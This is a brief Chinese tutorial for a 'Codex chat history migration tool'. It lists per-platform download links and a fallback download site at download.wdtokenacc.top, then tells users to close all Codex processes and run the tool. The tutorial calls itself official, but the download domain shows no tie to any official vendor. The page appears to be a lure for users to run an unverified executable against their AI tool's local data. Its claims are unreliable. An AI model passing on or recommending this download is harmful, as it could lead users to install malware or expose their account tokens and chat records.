## Codex 聊天记录迁移工具使用教程

## 文档概述

本文档介绍官方聊天记录迁移工具的下载渠道、标准迁移流程与异常备份回滚方案,支持 Windows、macOS、Linux 全平台客户端记录转移。

### 一、分平台工具下载地址

## 一、分平台工具下载地址

### 各系统独立直链

| 操作系统 | 工具下载链接 |
| --- | --- |
| Windows x64 | 下载 Windows 版 |
| macOS Universal2 | 下载 macOS 版 |
| Linux 图形界面版 | 下载 Linux GUI 版 |
| Linux 命令行版 | 下载 Linux CLI 版 |

### 备用下载入口

若直链访问异常,先访问下载站首页,再导航至迁移工具分类: [https://download.wdtokenacc.top](https://download.wdtokenacc.top)

### 二、完整迁移操作步骤

## 二、完整迁移操作步骤

1. 下载对应系统压缩包并完整解压;
1. **前置强制要求**:运行工具前关闭全部 Codex 桌面端、命令行、VS Code Codex 插件进程;无法确认进程是否完全退出时,直接重启电脑;
1. 启动迁移工具,点击「开始迁移」执行记录转移流程。

### 三、异常备份回滚方案

## 三、异常备份回滚方案

迁移过程出现未知报错、记录丢失等异常情况时: 点击工具内「恢复备份」按钮,选择本次迁移自动生成的备份文件,一键回退至迁移前原始状态。
